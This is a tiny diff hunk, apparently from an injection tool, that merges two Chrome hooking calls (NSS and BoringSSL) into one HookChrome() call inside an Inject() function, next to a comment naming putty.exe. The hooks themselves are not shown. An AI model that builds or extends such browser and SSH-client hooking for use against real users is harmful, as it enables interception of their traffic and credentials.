@@ -134,8 +134,7 @@ void Inject()
 		{
 			// Hook Chrome functions
 
-			HookChromeNSS();
-			HookChromeBoring();
+			HookChrome();
 		}
 
 		// putty.exe
